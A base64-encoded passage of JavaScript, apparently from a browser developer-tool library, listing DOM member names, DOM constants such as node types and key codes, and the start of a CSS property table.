A0KICAgICJsb29rdXBOYW1lc3BhY2VVUkkiLA0KICAgICJsb29rdXBQcmVmaXgiLA0KICAgICJub3JtYWxpemUiLA0KICAgICJub3JtYWxpemVEb2N1bWVudCIsDQogICAgImdldEZlYXR1cmUiLA0KICAgICJnZXRVc2VyRGF0YSIsDQogICAgInNldFVzZXJEYXRhIg0KXSk7DQoNCmRvbU1lbWJlck1hcC5FbGVtZW50ID0gZXh0ZW5kQXJyYXkoZG9tTWVtYmVyTWFwLk5vZGUsDQpbDQogICAgImNsaWVudFdpZHRoIiwNCiAgICAiY2xpZW50SGVpZ2h0IiwNCiAgICAib2Zmc2V0TGVmdCIsDQogICAgIm9mZnNldFRvcCIsDQogICAgIm9mZnNldFdpZHRoIiwNCiAgICAib2Zmc2V0SGVpZ2h0IiwNCiAgICAic2Nyb2xsTGVmdCIsDQogICAgInNjcm9sbFRvcCIsDQogICAgInNjcm9sbFdpZHRoIiwNCiAgICAic2Nyb2xsSGVpZ2h0IiwNCg0KICAgICJzdHlsZSIsDQoNCiAgICAidGFiSW5kZXgiLA0KICAgICJ0aXRsZSIsDQogICAgImxhbmciLA0KICAgICJhbGlnbiIsDQogICAgInNwZWxsY2hlY2siLA0KDQogICAgImFkZEV2ZW50TGlzdGVuZXIiLA0KICAgICJyZW1vdmVFdmVudExpc3RlbmVyIiwNCiAgICAiZGlzcGF0Y2hFdmVudCIsDQogICAgImZvY3VzIiwNCiAgICAiYmx1ciIsDQogICAgImNsb25lTm9kZSIsDQogICAgImFwcGVuZENoaWxkIiwNCiAgICAiaW5zZXJ0QmVmb3JlIiwNCiAgICAicmVwbGFjZUNoaWxkIiwNCiAgICAicmVtb3ZlQ2hpbGQiLA0KICAgICJjb21wYXJlRG9jdW1lbnRQb3NpdGlvbiIsDQogICAgImdldEVsZW1lbnRzQnlUYWdOYW1lIiwNCiAgICAiZ2V0RWxlbWVudHNCeVRhZ05hbWVOUyIsDQogICAgImdldEF0dHJpYnV0ZSIsDQogICAgImdldEF0dHJpYnV0ZU5TIiwNCiAgICAiZ2V0QXR0cmlidXRlTm9kZSIsDQogICAgImdldEF0dHJpYnV0ZU5vZGVOUyIsDQogICAgInNldEF0dHJpYnV0ZSIsDQogICAgInNldEF0dHJpYnV0ZU5TIiwNCiAgICAic2V0QXR0cmlidXRlTm9kZSIsDQogICAgInNldEF0dHJpYnV0ZU5vZGVOUyIsDQogICAgInJlbW92ZUF0dHJpYnV0ZSIsDQogICAgInJlbW92ZUF0dHJpYnV0ZU5TIiwNCiAgICAicmVtb3ZlQXR0cmlidXRlTm9kZSIsDQogICAgImhhc0F0dHJpYnV0ZSIsDQogICAgImhhc0F0dHJpYnV0ZU5TIiwNCiAgICAiaGFzQXR0cmlidXRlcyIsDQogICAgImhhc0NoaWxkTm9kZXMiLA0KICAgICJsb29rdXBOYW1lc3BhY2VVUkkiLA0KICAgICJsb29rdXBQcmVmaXgiLA0KICAgICJub3JtYWxpemUiLA0KICAgICJpc0RlZmF1bHROYW1lc3BhY2UiLA0KICAgICJpc0VxdWFsTm9kZSIsDQogICAgImlzU2FtZU5vZGUiLA0KICAgICJpc1N1cHBvcnRlZCIsDQogICAgImdldEZlYXR1cmUiLA0KICAgICJnZXRVc2VyRGF0YSIsDQogICAgInNldFVzZXJEYXRhIg0KXSk7DQoNCmRvbU1lbWJlck1hcC5TVkdFbGVtZW50ID0gZXh0ZW5kQXJyYXkoZG9tTWVtYmVyTWFwLkVsZW1lbnQsDQpbDQogICAgIngiLA0KICAgICJ5IiwNCiAgICAid2lkdGgiLA0KICAgICJoZWlnaHQiLA0KICAgICJyeCIsDQogICAgInJ5IiwNCiAgICAidHJhbnNmb3JtIiwNCiAgICAiaHJlZiIsDQoNCiAgICAib3duZXJTVkdFbGVtZW50IiwNCiAgICAidmlld3BvcnRFbGVtZW50IiwNCiAgICAiZmFydGhlc3RWaWV3cG9ydEVsZW1lbnQiLA0KICAgICJuZWFyZXN0Vmlld3BvcnRFbGVtZW50IiwNCg0KICAgICJnZXRCQm94IiwNCiAgICAiZ2V0Q1RNIiwNCiAgICAiZ2V0U2NyZWVuQ1RNIiwNCiAgICAiZ2V0VHJhbnNmb3JtVG9FbGVtZW50IiwNCiAgICAiZ2V0UHJlc2VudGF0aW9uQXR0cmlidXRlIiwNCiAgICAicHJlc2VydmVBc3BlY3RSYXRpbyINCl0pOw0KDQpkb21NZW1iZXJNYXAuU1ZHU1ZHRWxlbWVudCA9IGV4dGVuZEFycmF5KGRvbU1lbWJlck1hcC5FbGVtZW50LA0KWw0KICAgICJ4IiwNCiAgICAieSIsDQogICAgIndpZHRoIiwNCiAgICAiaGVpZ2h0IiwNCiAgICAicngiLA0KICAgICJyeSIsDQogICAgInRyYW5zZm9ybSIsDQoNCiAgICAidmlld0JveCIsDQogICAgInZpZXdwb3J0IiwNCiAgICAiY3VycmVudFZpZXciLA0KICAgICJ1c2VDdXJyZW50VmlldyIsDQogICAgInBpeGVsVW5pdFRvTWlsbGltZXRlclgiLA0KICAgICJwaXhlbFVuaXRUb01pbGxpbWV0ZXJZIiwNCiAgICAic2NyZWVuUGl4ZWxUb01pbGxpbWV0ZXJYIiwNCiAgICAic2NyZWVuUGl4ZWxUb01pbGxpbWV0ZXJZIiwNCiAgICAiY3VycmVudFNjYWxlIiwNCiAgICAiY3VycmVudFRyYW5zbGF0ZSIsDQogICAgInpvb21BbmRQYW4iLA0KDQogICAgIm93bmVyU1ZHRWxlbWVudCIsDQogICAgInZpZXdwb3J0RWxlbWVudCIsDQogICAgImZhcnRoZXN0Vmlld3BvcnRFbGVtZW50IiwNCiAgICAibmVhcmVzdFZpZXdwb3J0RWxlbWVudCIsDQogICAgImNvbnRlbnRTY3JpcHRUeXBlIiwNCiAgICAiY29udGVudFN0eWxlVHlwZSIsDQoNCiAgICAiZ2V0QkJveCIsDQogICAgImdldENUTSIsDQogICAgImdldFNjcmVlbkNUTSIsDQogICAgImdldFRyYW5zZm9ybVRvRWxlbWVudCIsDQogICAgImdldEVuY2xvc3VyZUxpc3QiLA0KICAgICJnZXRJbnRlcnNlY3Rpb25MaXN0IiwNCiAgICAiZ2V0Vmlld2JveFRvVmlld3BvcnRUcmFuc2Zvcm0iLA0KICAgICJnZXRQcmVzZW50YXRpb25BdHRyaWJ1dGUiLA0KICAgICJnZXRFbGVtZW50QnlJZCIsDQogICAgImNoZWNrRW5jbG9zdXJlIiwNCiAgICAiY2hlY2tJbnRlcnNlY3Rpb24iLA0KICAgICJjcmVhdGVTVkdBbmdsZSIsDQogICAgImNyZWF0ZVNWR0xlbmd0aCIsDQogICAgImNyZWF0ZVNWR01hdHJpeCIsDQogICAgImNyZWF0ZVNWR051bWJlciIsDQogICAgImNyZWF0ZVNWR1BvaW50IiwNCiAgICAiY3JlYXRlU1ZHUmVjdCIsDQogICAgImNyZWF0ZVNWR1N0cmluZyIsDQogICAgImNyZWF0ZVNWR1RyYW5zZm9ybSIsDQogICAgImNyZWF0ZVNWR1RyYW5zZm9ybUZyb21NYXRyaXgiLA0KICAgICJkZVNlbGVjdEFsbCIsDQogICAgInByZXNlcnZlQXNwZWN0UmF0aW8iLA0KICAgICJmb3JjZVJlZHJhdyIsDQogICAgInN1c3BlbmRSZWRyYXciLA0KICAgICJ1bnN1c3BlbmRSZWRyYXciLA0KICAgICJ1bnN1c3BlbmRSZWRyYXdBbGwiLA0KICAgICJnZXRDdXJyZW50VGltZSIsDQogICAgInNldEN1cnJlbnRUaW1lIiwNCiAgICAiYW5pbWF0aW9uc1BhdXNlZCIsDQogICAgInBhdXNlQW5pbWF0aW9ucyIsDQogICAgInVucGF1c2VBbmltYXRpb25zIg0KXSk7DQoNCmRvbU1lbWJlck1hcC5IVE1MSW1hZ2VFbGVtZW50ID0gZXh0ZW5kQXJyYXkoZG9tTWVtYmVyTWFwLkVsZW1lbnQsDQpbDQogICAgInNyYyIsDQogICAgIm5hdHVyYWxXaWR0aCIsDQogICAgIm5hdHVyYWxIZWlnaHQiLA0KICAgICJ3aWR0aCIsDQogICAgImhlaWdodCIsDQogICAgIngiLA0KICAgICJ5IiwNCiAgICAibmFtZSIsDQogICAgImFsdCIsDQogICAgImxvbmdEZXNjIiwNCiAgICAibG93c3JjIiwNCiAgICAiYm9yZGVyIiwNCiAgICAiY29tcGxldGUiLA0KICAgICJoc3BhY2UiLA0KICAgICJ2c3BhY2UiLA0KICAgICJpc01hcCIsDQogICAgInVzZU1hcCINCl0pOw0KDQpkb21NZW1iZXJNYXAuSFRNTEFuY2hvckVsZW1lbnQgPSBleHRlbmRBcnJheShkb21NZW1iZXJNYXAuRWxlbWVudCwNClsNCiAgICAibmFtZSIsDQogICAgInRhcmdldCIsDQogICAgImFjY2Vzc0tleSIsDQogICAgImhyZWYiLA0KICAgICJwcm90b2NvbCIsDQogICAgImhvc3QiLA0KICAgICJob3N0bmFtZSIsDQogICAgInBvcnQiLA0KICAgICJwYXRobmFtZSIsDQogICAgInNlYXJjaCIsDQogICAgImhhc2giLA0KICAgICJocmVmbGFuZyIsDQogICAgImNvb3JkcyIsDQogICAgInNoYXBlIiwNCiAgICAidGV4dCIsDQogICAgInR5cGUiLA0KICAgICJyZWwiLA0KICAgICJyZXYiLA0KICAgICJjaGFyc2V0Ig0KXSk7DQoNCmRvbU1lbWJlck1hcC5IVE1MSUZyYW1lRWxlbWVudCA9IGV4dGVuZEFycmF5KGRvbU1lbWJlck1hcC5FbGVtZW50LA0KWw0KICAgICJjb250ZW50RG9jdW1lbnQiLA0KICAgICJjb250ZW50V2luZG93IiwNCiAgICAiZnJhbWVCb3JkZXIiLA0KICAgICJoZWlnaHQiLA0KICAgICJsb25nRGVzYyIsDQogICAgIm1hcmdpbkhlaWdodCIsDQogICAgIm1hcmdpbldpZHRoIiwNCiAgICAibmFtZSIsDQogICAgInNjcm9sbGluZyIsDQogICAgInNyYyIsDQogICAgIndpZHRoIg0KXSk7DQoNCmRvbU1lbWJlck1hcC5IVE1MVGFibGVFbGVtZW50ID0gZXh0ZW5kQXJyYXkoZG9tTWVtYmVyTWFwLkVsZW1lbnQsDQpbDQogICAgImJnQ29sb3IiLA0KICAgICJib3JkZXIiLA0KICAgICJjYXB0aW9uIiwNCiAgICAiY2VsbFBhZGRpbmciLA0KICAgICJjZWxsU3BhY2luZyIsDQogICAgImZyYW1lIiwNCiAgICAicm93cyIsDQogICAgInJ1bGVzIiwNCiAgICAic3VtbWFyeSIsDQogICAgInRCb2RpZXMiLA0KICAgICJ0Rm9vdCIsDQogICAgInRIZWFkIiwNCiAgICAid2lkdGgiLA0KDQogICAgImNyZWF0ZUNhcHRpb24iLA0KICAgICJjcmVhdGVURm9vdCIsDQogICAgImNyZWF0ZVRIZWFkIiwNCiAgICAiZGVsZXRlQ2FwdGlvbiIsDQogICAgImRlbGV0ZVJvdyIsDQogICAgImRlbGV0ZVRGb290IiwNCiAgICAiZGVsZXRlVEhlYWQiLA0KICAgICJpbnNlcnRSb3ciDQpdKTsNCg0KZG9tTWVtYmVyTWFwLkhUTUxUYWJsZVJvd0VsZW1lbnQgPSBleHRlbmRBcnJheShkb21NZW1iZXJNYXAuRWxlbWVudCwNClsNCiAgICAiYmdDb2xvciIsDQogICAgImNlbGxzIiwNCiAgICAiY2giLA0KICAgICJjaE9mZiIsDQogICAgInJvd0luZGV4IiwNCiAgICAic2VjdGlvblJvd0luZGV4IiwNCiAgICAidkFsaWduIiwNCg0KICAgICJkZWxldGVDZWxsIiwNCiAgICAiaW5zZXJ0Q2VsbCINCl0pOw0KDQpkb21NZW1iZXJNYXAuSFRNTFRhYmxlQ2VsbEVsZW1lbnQgPSBleHRlbmRBcnJheShkb21NZW1iZXJNYXAuRWxlbWVudCwNClsNCiAgICAiYWJiciIsDQogICAgImF4aXMiLA0KICAgICJiZ0NvbG9yIiwNCiAgICAiY2VsbEluZGV4IiwNCiAgICAiY2giLA0KICAgICJjaE9mZiIsDQogICAgImNvbFNwYW4iLA0KICAgICJoZWFkZXJzIiwNCiAgICAiaGVpZ2h0IiwNCiAgICAibm9XcmFwIiwNCiAgICAicm93U3BhbiIsDQogICAgInNjb3BlIiwNCiAgICAidkFsaWduIiwNCiAgICAid2lkdGgiDQoNCl0pOw0KDQpkb21NZW1iZXJNYXAuSFRNTFNjcmlwdEVsZW1lbnQgPSBleHRlbmRBcnJheShkb21NZW1iZXJNYXAuRWxlbWVudCwNClsNCiAgICAic3JjIg0KXSk7DQoNCmRvbU1lbWJlck1hcC5IVE1MQnV0dG9uRWxlbWVudCA9IGV4dGVuZEFycmF5KGRvbU1lbWJlck1hcC5FbGVtZW50LA0KWw0KICAgICJhY2Nlc3NLZXkiLA0KICAgICJkaXNhYmxlZCIsDQogICAgImZvcm0iLA0KICAgICJuYW1lIiwNCiAgICAidHlwZSIsDQogICAgInZhbHVlIiwNCg0KICAgICJjbGljayINCl0pOw0KDQpkb21NZW1iZXJNYXAuSFRNTElucHV0RWxlbWVudCA9IGV4dGVuZEFycmF5KGRvbU1lbWJlck1hcC5FbGVtZW50LA0KWw0KICAgICJ0eXBlIiwNCiAgICAidmFsdWUiLA0KICAgICJjaGVja2VkIiwNCiAgICAiYWNjZXB0IiwNCiAgICAiYWNjZXNzS2V5IiwNCiAgICAiYWx0IiwNCiAgICAiY29udHJvbGxlcnMiLA0KICAgICJkZWZhdWx0Q2hlY2tlZCIsDQogICAgImRlZmF1bHRWYWx1ZSIsDQogICAgImRpc2FibGVkIiwNCiAgICAiZm9ybSIsDQogICAgIm1heExlbmd0aCIsDQogICAgIm5hbWUiLA0KICAgICJyZWFkT25seSIsDQogICAgInNlbGVjdGlvbkVuZCIsDQogICAgInNlbGVjdGlvblN0YXJ0IiwNCiAgICAic2l6ZSIsDQogICAgInNyYyIsDQogICAgInRleHRMZW5ndGgiLA0KICAgICJ1c2VNYXAiLA0KDQogICAgImNsaWNrIiwNCiAgICAic2VsZWN0IiwNCiAgICAic2V0U2VsZWN0aW9uUmFuZ2UiDQpdKTsNCg0KZG9tTWVtYmVyTWFwLkhUTUxGb3JtRWxlbWVudCA9IGV4dGVuZEFycmF5KGRvbU1lbWJlck1hcC5FbGVtZW50LA0KWw0KICAgICJhY2NlcHRDaGFyc2V0IiwNCiAgICAiYWN0aW9uIiwNCiAgICAiYXV0aG9yIiwNCiAgICAiZWxlbWVudHMiLA0KICAgICJlbmNvZGluZyIsDQogICAgImVuY3R5cGUiLA0KICAgICJlbnRyeV9pZCIsDQogICAgImxlbmd0aCIsDQogICAgIm1ldGhvZCIsDQogICAgIm5hbWUiLA0KICAgICJwb3N0IiwNCiAgICAidGFyZ2V0IiwNCiAgICAidGV4dCIsDQogICAgInVybCIsDQoNCiAgICAicmVzZXQiLA0KICAgICJzdWJtaXQiDQpdKTsNCg0KZG9tTWVtYmVyTWFwLkhUTUxCb2R5RWxlbWVudCA9IGV4dGVuZEFycmF5KGRvbU1lbWJlck1hcC5FbGVtZW50LA0KWw0KICAgICJhTGluayIsDQogICAgImJhY2tncm91bmQiLA0KICAgICJiZ0NvbG9yIiwNCiAgICAibGluayIsDQogICAgInRleHQiLA0KICAgICJ2TGluayINCl0pOw0KDQpkb21NZW1iZXJNYXAuSFRNTEh0bWxFbGVtZW50ID0gZXh0ZW5kQXJyYXkoZG9tTWVtYmVyTWFwLkVsZW1lbnQsDQpbDQogICAgInZlcnNpb24iDQpdKTsNCg0KZG9tTWVtYmVyTWFwLlRleHQgPSBleHRlbmRBcnJheShkb21NZW1iZXJNYXAuTm9kZSwNClsNCiAgICAiZGF0YSIsDQogICAgImxlbmd0aCIsDQoNCiAgICAiYXBwZW5kRGF0YSIsDQogICAgImRlbGV0ZURhdGEiLA0KICAgICJpbnNlcnREYXRhIiwNCiAgICAicmVwbGFjZURhdGEiLA0KICAgICJzcGxpdFRleHQiLA0KICAgICJzdWJzdHJpbmdEYXRhIg0KXSk7DQoNCmRvbU1lbWJlck1hcC5BdHRyID0gZXh0ZW5kQXJyYXkoZG9tTWVtYmVyTWFwLk5vZGUsDQpbDQogICAgIm5hbWUiLA0KICAgICJ2YWx1ZSIsDQogICAgInNwZWNpZmllZCIsDQogICAgIm93bmVyRWxlbWVudCINCl0pOw0KDQpkb21NZW1iZXJNYXAuRXZlbnQgPQ0KWw0KICAgICJ0eXBlIiwNCiAgICAidGFyZ2V0IiwNCiAgICAiY3VycmVudFRhcmdldCIsDQogICAgIm9yaWdpbmFsVGFyZ2V0IiwNCiAgICAiZXhwbGljaXRPcmlnaW5hbFRhcmdldCIsDQogICAgInJlbGF0ZWRUYXJnZXQiLA0KICAgICJyYW5nZVBhcmVudCIsDQogICAgInJhbmdlT2Zmc2V0IiwNCiAgICAidmlldyIsDQoNCiAgICAia2V5Q29kZSIsDQogICAgImNoYXJDb2RlIiwNCiAgICAic2NyZWVuWCIsDQogICAgInNjcmVlblkiLA0KICAgICJjbGllbnRYIiwNCiAgICAiY2xpZW50WSIsDQogICAgImxheWVyWCIsDQogICAgImxheWVyWSIsDQogICAgInBhZ2VYIiwNCiAgICAicGFnZVkiLA0KDQogICAgImRldGFpbCIsDQogICAgImJ1dHRvbiIsDQogICAgIndoaWNoIiwNCiAgICAiY3RybEtleSIsDQogICAgInNoaWZ0S2V5IiwNCiAgICAiYWx0S2V5IiwNCiAgICAibWV0YUtleSIsDQoNCiAgICAiZXZlbnRQaGFzZSIsDQogICAgInRpbWVTdGFtcCIsDQogICAgImJ1YmJsZXMiLA0KICAgICJjYW5jZWxhYmxlIiwNCiAgICAiY2FuY2VsQnViYmxlIiwNCg0KICAgICJpc1RydXN0ZWQiLA0KICAgICJpc0NoYXIiLA0KDQogICAgImdldFByZXZlbnREZWZhdWx0IiwNCiAgICAiaW5pdEV2ZW50IiwNCiAgICAiaW5pdE1vdXNlRXZlbnQiLA0KICAgICJpbml0S2V5RXZlbnQiLA0KICAgICJpbml0VUlFdmVudCIsDQogICAgInByZXZlbnRCdWJibGUiLA0KICAgICJwcmV2ZW50Q2FwdHVyZSIsDQogICAgInByZXZlbnREZWZhdWx0IiwNCiAgICAic3RvcFByb3BhZ2F0aW9uIg0KXTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdGhpcy5kb21Db25zdGFudE1hcCA9DQp7DQogICAgIkVMRU1FTlRfTk9ERSI6IDEsDQogICAgIkFUVFJJQlVURV9OT0RFIjogMSwNCiAgICAiVEVYVF9OT0RFIjogMSwNCiAgICAiQ0RBVEFfU0VDVElPTl9OT0RFIjogMSwNCiAgICAiRU5USVRZX1JFRkVSRU5DRV9OT0RFIjogMSwNCiAgICAiRU5USVRZX05PREUiOiAxLA0KICAgICJQUk9DRVNTSU5HX0lOU1RSVUNUSU9OX05PREUiOiAxLA0KICAgICJDT01NRU5UX05PREUiOiAxLA0KICAgICJET0NVTUVOVF9OT0RFIjogMSwNCiAgICAiRE9DVU1FTlRfVFlQRV9OT0RFIjogMSwNCiAgICAiRE9DVU1FTlRfRlJBR01FTlRfTk9ERSI6IDEsDQogICAgIk5PVEFUSU9OX05PREUiOiAxLA0KDQogICAgIkRPQ1VNRU5UX1BPU0lUSU9OX0RJU0NPTk5FQ1RFRCI6IDEsDQogICAgIkRPQ1VNRU5UX1BPU0lUSU9OX1BSRUNFRElORyI6IDEsDQogICAgIkRPQ1VNRU5UX1BPU0lUSU9OX0ZPTExPV0lORyI6IDEsDQogICAgIkRPQ1VNRU5UX1BPU0lUSU9OX0NPTlRBSU5TIjogMSwNCiAgICAiRE9DVU1FTlRfUE9TSVRJT05fQ09OVEFJTkVEX0JZIjogMSwNCiAgICAiRE9DVU1FTlRfUE9TSVRJT05fSU1QTEVNRU5UQVRJT05fU1BFQ0lGSUMiOiAxLA0KDQogICAgIlVOS05PV05fUlVMRSI6IDEsDQogICAgIlNUWUxFX1JVTEUiOiAxLA0KICAgICJDSEFSU0VUX1JVTEUiOiAxLA0KICAgICJJTVBPUlRfUlVMRSI6IDEsDQogICAgIk1FRElBX1JVTEUiOiAxLA0KICAgICJGT05UX0ZBQ0VfUlVMRSI6IDEsDQogICAgIlBBR0VfUlVMRSI6IDEsDQoNCiAgICAiQ0FQVFVSSU5HX1BIQVNFIjogMSwNCiAgICAiQVRfVEFSR0VUIjogMSwNCiAgICAiQlVCQkxJTkdfUEhBU0UiOiAxLA0KDQogICAgIlNDUk9MTF9QQUdFX1VQIjogMSwNCiAgICAiU0NST0xMX1BBR0VfRE9XTiI6IDEsDQoNCiAgICAiTU9VU0VVUCI6IDEsDQogICAgIk1PVVNFRE9XTiI6IDEsDQogICAgIk1PVVNFT1ZFUiI6IDEsDQogICAgIk1PVVNFT1VUIjogMSwNCiAgICAiTU9VU0VNT1ZFIjogMSwNCiAgICAiTU9VU0VEUkFHIjogMSwNCiAgICAiQ0xJQ0siOiAxLA0KICAgICJEQkxDTElDSyI6IDEsDQogICAgIktFWURPV04iOiAxLA0KICAgICJLRVlVUCI6IDEsDQogICAgIktFWVBSRVNTIjogMSwNCiAgICAiRFJBR0RST1AiOiAxLA0KICAgICJGT0NVUyI6IDEsDQogICAgIkJMVVIiOiAxLA0KICAgICJTRUxFQ1QiOiAxLA0KICAgICJDSEFOR0UiOiAxLA0KICAgICJSRVNFVCI6IDEsDQogICAgIlNVQk1JVCI6IDEsDQogICAgIlNDUk9MTCI6IDEsDQogICAgIkxPQUQiOiAxLA0KICAgICJVTkxPQUQiOiAxLA0KICAgICJYRkVSX0RPTkUiOiAxLA0KICAgICJBQk9SVCI6IDEsDQogICAgIkVSUk9SIjogMSwNCiAgICAiTE9DQVRFIjogMSwNCiAgICAiTU9WRSI6IDEsDQogICAgIlJFU0laRSI6IDEsDQogICAgIkZPUldBUkQiOiAxLA0KICAgICJIRUxQIjogMSwNCiAgICAiQkFDSyI6IDEsDQogICAgIlRFWFQiOiAxLA0KDQogICAgIkFMVF9NQVNLIjogMSwNCiAgICAiQ09OVFJPTF9NQVNLIjogMSwNCiAgICAiU0hJRlRfTUFTSyI6IDEsDQogICAgIk1FVEFfTUFTSyI6IDEsDQoNCiAgICAiRE9NX1ZLX1RBQiI6IDEsDQogICAgIkRPTV9WS19QQUdFX1VQIjogMSwNCiAgICAiRE9NX1ZLX1BBR0VfRE9XTiI6IDEsDQogICAgIkRPTV9WS19VUCI6IDEsDQogICAgIkRPTV9WS19ET1dOIjogMSwNCiAgICAiRE9NX1ZLX0xFRlQiOiAxLA0KICAgICJET01fVktfUklHSFQiOiAxLA0KICAgICJET01fVktfQ0FOQ0VMIjogMSwNCiAgICAiRE9NX1ZLX0hFTFAiOiAxLA0KICAgICJET01fVktfQkFDS19TUEFDRSI6IDEsDQogICAgIkRPTV9WS19DTEVBUiI6IDEsDQogICAgIkRPTV9WS19SRVRVUk4iOiAxLA0KICAgICJET01fVktfRU5URVIiOiAxLA0KICAgICJET01fVktfU0hJRlQiOiAxLA0KICAgICJET01fVktfQ09OVFJPTCI6IDEsDQogICAgIkRPTV9WS19BTFQiOiAxLA0KICAgICJET01fVktfUEFVU0UiOiAxLA0KICAgICJET01fVktfQ0FQU19MT0NLIjogMSwNCiAgICAiRE9NX1ZLX0VTQ0FQRSI6IDEsDQogICAgIkRPTV9WS19TUEFDRSI6IDEsDQogICAgIkRPTV9WS19FTkQiOiAxLA0KICAgICJET01fVktfSE9NRSI6IDEsDQogICAgIkRPTV9WS19QUklOVFNDUkVFTiI6IDEsDQogICAgIkRPTV9WS19JTlNFUlQiOiAxLA0KICAgICJET01fVktfREVMRVRFIjogMSwNCiAgICAiRE9NX1ZLXzAiOiAxLA0KICAgICJET01fVktfMSI6IDEsDQogICAgIkRPTV9WS18yIjogMSwNCiAgICAiRE9NX1ZLXzMiOiAxLA0KICAgICJET01fVktfNCI6IDEsDQogICAgIkRPTV9WS181IjogMSwNCiAgICAiRE9NX1ZLXzYiOiAxLA0KICAgICJET01fVktfNyI6IDEsDQogICAgIkRPTV9WS184IjogMSwNCiAgICAiRE9NX1ZLXzkiOiAxLA0KICAgICJET01fVktfU0VNSUNPTE9OIjogMSwNCiAgICAiRE9NX1ZLX0VRVUFMUyI6IDEsDQogICAgIkRPTV9WS19BIjogMSwNCiAgICAiRE9NX1ZLX0IiOiAxLA0KICAgICJET01fVktfQyI6IDEsDQogICAgIkRPTV9WS19EIjogMSwNCiAgICAiRE9NX1ZLX0UiOiAxLA0KICAgICJET01fVktfRiI6IDEsDQogICAgIkRPTV9WS19HIjogMSwNCiAgICAiRE9NX1ZLX0giOiAxLA0KICAgICJET01fVktfSSI6IDEsDQogICAgIkRPTV9WS19KIjogMSwNCiAgICAiRE9NX1ZLX0siOiAxLA0KICAgICJET01fVktfTCI6IDEsDQogICAgIkRPTV9WS19NIjogMSwNCiAgICAiRE9NX1ZLX04iOiAxLA0KICAgICJET01fVktfTyI6IDEsDQogICAgIkRPTV9WS19QIjogMSwNCiAgICAiRE9NX1ZLX1EiOiAxLA0KICAgICJET01fVktfUiI6IDEsDQogICAgIkRPTV9WS19TIjogMSwNCiAgICAiRE9NX1ZLX1QiOiAxLA0KICAgICJET01fVktfVSI6IDEsDQogICAgIkRPTV9WS19WIjogMSwNCiAgICAiRE9NX1ZLX1ciOiAxLA0KICAgICJET01fVktfWCI6IDEsDQogICAgIkRPTV9WS19ZIjogMSwNCiAgICAiRE9NX1ZLX1oiOiAxLA0KICAgICJET01fVktfQ09OVEVYVF9NRU5VIjogMSwNCiAgICAiRE9NX1ZLX05VTVBBRDAiOiAxLA0KICAgICJET01fVktfTlVNUEFEMSI6IDEsDQogICAgIkRPTV9WS19OVU1QQUQyIjogMSwNCiAgICAiRE9NX1ZLX05VTVBBRDMiOiAxLA0KICAgICJET01fVktfTlVNUEFENCI6IDEsDQogICAgIkRPTV9WS19OVU1QQUQ1IjogMSwNCiAgICAiRE9NX1ZLX05VTVBBRDYiOiAxLA0KICAgICJET01fVktfTlVNUEFENyI6IDEsDQogICAgIkRPTV9WS19OVU1QQUQ4IjogMSwNCiAgICAiRE9NX1ZLX05VTVBBRDkiOiAxLA0KICAgICJET01fVktfTVVMVElQTFkiOiAxLA0KICAgICJET01fVktfQUREIjogMSwNCiAgICAiRE9NX1ZLX1NFUEFSQVRPUiI6IDEsDQogICAgIkRPTV9WS19TVUJUUkFDVCI6IDEsDQogICAgIkRPTV9WS19ERUNJTUFMIjogMSwNCiAgICAiRE9NX1ZLX0RJVklERSI6IDEsDQogICAgIkRPTV9WS19GMSI6IDEsDQogICAgIkRPTV9WS19GMiI6IDEsDQogICAgIkRPTV9WS19GMyI6IDEsDQogICAgIkRPTV9WS19GNCI6IDEsDQogICAgIkRPTV9WS19GNSI6IDEsDQogICAgIkRPTV9WS19GNiI6IDEsDQogICAgIkRPTV9WS19GNyI6IDEsDQogICAgIkRPTV9WS19GOCI6IDEsDQogICAgIkRPTV9WS19GOSI6IDEsDQogICAgIkRPTV9WS19GMTAiOiAxLA0KICAgICJET01fVktfRjExIjogMSwNCiAgICAiRE9NX1ZLX0YxMiI6IDEsDQogICAgIkRPTV9WS19GMTMiOiAxLA0KICAgICJET01fVktfRjE0IjogMSwNCiAgICAiRE9NX1ZLX0YxNSI6IDEsDQogICAgIkRPTV9WS19GMTYiOiAxLA0KICAgICJET01fVktfRjE3IjogMSwNCiAgICAiRE9NX1ZLX0YxOCI6IDEsDQogICAgIkRPTV9WS19GMTkiOiAxLA0KICAgICJET01fVktfRjIwIjogMSwNCiAgICAiRE9NX1ZLX0YyMSI6IDEsDQogICAgIkRPTV9WS19GMjIiOiAxLA0KICAgICJET01fVktfRjIzIjogMSwNCiAgICAiRE9NX1ZLX0YyNCI6IDEsDQogICAgIkRPTV9WS19OVU1fTE9DSyI6IDEsDQogICAgIkRPTV9WS19TQ1JPTExfTE9DSyI6IDEsDQogICAgIkRPTV9WS19DT01NQSI6IDEsDQogICAgIkRPTV9WS19QRVJJT0QiOiAxLA0KICAgICJET01fVktfU0xBU0giOiAxLA0KICAgICJET01fVktfQkFDS19RVU9URSI6IDEsDQogICAgIkRPTV9WS19PUEVOX0JSQUNLRVQiOiAxLA0KICAgICJET01fVktfQkFDS19TTEFTSCI6IDEsDQogICAgIkRPTV9WS19DTE9TRV9CUkFDS0VUIjogMSwNCiAgICAiRE9NX1ZLX1FVT1RFIjogMSwNCiAgICAiRE9NX1ZLX01FVEEiOiAxLA0KDQogICAgIlNWR19aT09NQU5EUEFOX0RJU0FCTEUiOiAxLA0KICAgICJTVkdfWk9PTUFORFBBTl9NQUdOSUZZIjogMSwNCiAgICAiU1ZHX1pPT01BTkRQQU5fVU5LTk9XTiI6IDENCn07DQoNCnRoaXMuY3NzSW5mbyA9DQp7DQogICAgImJhY2tncm91bmQiOiBbImJnUmVwZWF0IiwgImJnQXR0YWNobWVudCIsICJiZ1Bvc2l0aW9uIiwgImNvbG9yIiwgInN5c3RlbUNvbG9yIiwgIm5vbmUiXSwNCiAgICAiYmFja2dyb3VuZC1hdHRhY2htZW50IjogWyJiZ0F0dGFjaG1lbnQiXSwNCiAgICAiYmFja2dyb3VuZC1jb2xvciI6IFsiY29sb3IiLCAic3lzdGVtQ29sb3IiXSwNCiAgICAiYmFja2dyb3VuZC1pbWFnZSI6IFsibm9uZSJdLA0KICAgICJiYWNrZ3JvdW5kLXBvc2l0aW9uIjogWyJiZ1Bvc2l0aW9uIl0sDQogICAgImJhY2tncm91bmQtcmVwZWF0IjogWyJiZ1JlcGVhdCJdLA0KDQogICAgImJvcmRlciI6IFsiYm9yZGVyU3R5bGUiLCAidGhpY2tuZXNzIiwgImNvbG9yIiwgInN5c3RlbUNvbG9yIiwgIm5vbmUiX